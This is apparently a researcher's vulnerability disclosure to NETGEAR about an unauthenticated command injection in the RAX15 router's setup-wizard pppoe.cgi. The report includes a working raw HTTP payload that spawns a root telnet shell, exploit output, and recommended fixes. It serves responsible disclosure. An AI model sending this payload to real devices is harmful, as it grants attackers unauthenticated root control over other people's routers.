# NETGEAR RAX15: Unauthenticated Command Injection via pppoe.cgi (Setup Wizard) → pppd "pty" Option → Root Shell

- **Report date**: 2026-10-04
- **Vendor**: NETGEAR, Inc. (PSIRT)

---

## Summary

While the RAX15 is in factory / setup-wizard state (the out-of-box condition and any state after a factory reset), its web interface accepts **unauthenticated** `POST` requests to `/pppoe.cgi` (also reachable via the wizard variants under `wiz/`/`bsw/`/`genie`). The `pppoe_servicename` parameter is URL-decoded but never charset-validated: newline (`%0A`) and TAB (`%09`) bytes pass through both escaping rounds performed by `acos_service` and are written verbatim into the `pty 'pppoecd -I %s -S %s'` line of the generated pppd options file (`/tmp/ppp/options`). pppd 2.4.7's `getword()` preserves newlines inside single quotes, and `device_script()` executes the option value via `execl("/bin/sh", "sh", "-c", ...)` as root. The result is unauthenticated LAN-side root command injection during the setup wizard.

## Affected Products, Models and Versions

| Product | Hardware / Board | Firmware | Status |
|---|---|---|---|
| NETGEAR RAX15 | U12H401T00 (Cameo OEM), all hardware revisions | `RAX15-V1.0.18.144_2.0.101.chk` (build date 2025-07-29, latest release) | **Verified vulnerable** (sink chain dynamically executed; see Verification) |

## Technical Details (Root Cause)

Complete second-order injection chain, each hop verified in the firmware:

1. **HTTP entry** — httpd handler for `/pppoe.cgi` (ARM binary `httpd`, CGI dispatcher sub_3C00C; URL decode in sub_2B4E4 performs `%0A→\n`, `%09→\t` with **no character-set validation**). The decoded `pppoe_servicename` is stored to NVRAM via `acosNvramConfig_set("pppoe_servicename", <raw value>)`. In factory/BRS state this CGI is reachable without credentials (same endpoint family as `wiz_pppoe.cgi` / `bsw_pppoe.cgi` / `genie` variants).
2. **Config generation** — `acos_service restart_wan` (function at offset `0x2D704` in `acos_service`) formats the service name into the pppd options file: `pty 'pppoecd -I %s -S %s'\n`. Before writing, it runs an escaping loop over the value using the character-class bitmap `0xD80017DF`. That bitmap escapes every shell metacharacter **and the space**, but control characters `\n` (0x0A) and `\t` (0x09) pass through **both** escaping rounds unchanged (dynamic verification: the generated `options` file contains the raw injected bytes).
3. **Sink** — `system("/sbin/pppd file /tmp/ppp/options &")` launches the firmware's pppd 2.4.7. Its `getword()` tokenizer keeps newlines inside quoted strings (verified dynamically: quoted newlines are swallowed into the word; only a *bare* newline outside quotes aborts parsing). The `pty` option value is handed to `device_script()`, which runs `execl("/bin/sh", "sh", "-c", <pty value>)` as root.
4. **Execution** — `/bin/sh` treats the embedded newline as a command separator: the attacker's line is executed as root alongside the intended `pppoecd` invocation.

Payload constraint (inherent to the escaping): the injected command must not contain spaces or shell metacharacters. TABs are used as word separators (`%09`) and newlines delimit the injected line (`%0A`).

## Proof of Concept / Reproduction Steps

Prerequisites: LAN access; device in factory state (or wizard not completed) so `/pppoe.cgi` is unauthenticated.

```bash
# One-click: inject, then wait for pppd to spawn the root shell and verify uid=0
$ python3 exploit_v3_pppoe_inject.py 192.168.1.1
[*] POST http://192.168.1.1/pppoe.cgi (142 bytes)
[+] httpd responded: HTTP/1.1 200 OK
[*] waiting for root shell on tcp/2323 .....
[+] tcp/2323 open - utelnetd spawned by pppd
# id
uid=0(root) gid=0(root)
[+] CONFIRMED: command executed as root via pppd pty injection
```

Raw HTTP request (equivalent):

```
POST /pppoe.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded

wan_proto=pppoe&pppoe_username=a&pppoe_passwd=b&pppoe_servicename=%0A/usr/sbin/utelnetd%09-p%092323%09-l%09/bin/sh%09-d%0A&pppoe_dod=0
```

The injected service name is `\n/usr/sbin/utelnetd\t-p\t2323\t-l\t/bin/sh\t-d\n` — TAB-separated words (spaces are backslash-escaped by `acos_service`), wrapped in newlines. After WAN restart, pppd executes it as root and the router listens on TCP/2323 with an unauthenticated root shell.

**Expected vs. actual behavior**

| | |
|---|---|
| **Expected** | `pppoe_servicename` is an opaque PPPoE service identifier; control characters are rejected or neutralized; the pppd options file contains only single-line, single-command values; the `pty` option invokes only the intended helper binary. |
| **Actual** | `%0A`/`%09` survive URL decoding and both escaping rounds and are written verbatim inside the quoted `pty` line; pppd preserves newlines within quotes and passes the multi-line value to `/bin/sh -c` as root; the injected command executes. |

## Verification

- **Sink chain (dynamically validated)**: using the firmware's own `/sbin/pppd` and an options file generated exactly per the firmware's escaping logic (function `0x2D704`), the injected `pty` value caused pppd to spawn `/usr/sbin/utelnetd -p 2323 -l /bin/sh -d` as root; connecting to TCP/2323 returned `uid=0(root)`. This validates the exploitation primitive end-to-end at the vulnerable component.
- **HTTP entry**: the byte-level format written by httpd into NVRAM/options (two-round escape bitmap `0xD80017DF`, `pty` line layout, `system()` call site) was verified by disassembly of the firmware ARM binaries (`acos_service` `0x2D704`, httpd `sub_3C00C`/`sub_2B4E4`).
- **Limitation (stated for completeness)**: in our full-system emulation environment, the Broadcom CMS middleware (`smd`; its `ssk` child) crashes on the emulation kernel's glibc, so the stock httpd request path could not be replayed end-to-end there. This is an emulation-kernel compatibility limitation, not a firmware behavior; on real hardware the wizard CGI is served by httpd directly. We recommend confirming the HTTP hop on a physical unit (the PoC above is ready to run).

## Security Impact

- Unauthenticated root command execution during the setup wizard — exactly the window where a new owner or a post-reset device is most exposed (unconfigured Wi-Fi password, default admin password).
- Attacker on the LAN can persist (flash-modify, add users, plant backdoors) before the legitimate owner finishes setup.
- All impact of arbitrary root execution: credential theft (PPPoE, Wi-Fi, GUI), DNS/DHCP manipulation of downstream clients, firmware tampering, pivoting.
- Note: the same flawed value is written by any authenticated `pppoe_servicename` change in normal operation, so the injection class also matters beyond the wizard window (then gated by admin authentication).

## Recommended Fix

1. Enforce a whitelist character set on `pppoe_servicename` (and every nvram value destined for a generated config file): reject all bytes `< 0x20` and any shell-relevant bytes **before** storage, not at format time.
2. Escape bitmap `0xD80017DF` must additionally cover C0 control bytes (0x00–0x1F); relying on shell-style backslash escaping for values that will be re-parsed by another tokenizer (pppd `getword`) is inherently unsafe — use per-tokenizer safe encoding or avoid interpolation entirely.
3. pppd invocation: validate at restart that each option file line is single-line and matches the expected grammar (helper binary + fixed flags only).
4. Audit sibling code paths that format user input into generated config files (`/tmp/ppp/options`, dnsmasq, smb.conf, etc.).

## Mitigation for End Users (until a fix ships)

Complete the setup wizard promptly (the endpoint then requires authentication); avoid exposing the wizard to untrusted LAN segments during setup.

## Attachments

- `exploit_v3_pppoe_inject.py` — one-click exploit: sends the injection, waits for pppd to spawn the root telnetd, verifies `uid=0`; supports interactive shell, custom commands, and the TLS front-end (`--https`).

## Researcher Contact & Credit

- **Name**: 【Lumina】
- **Contact**: 【1547800591@qq.com】

---
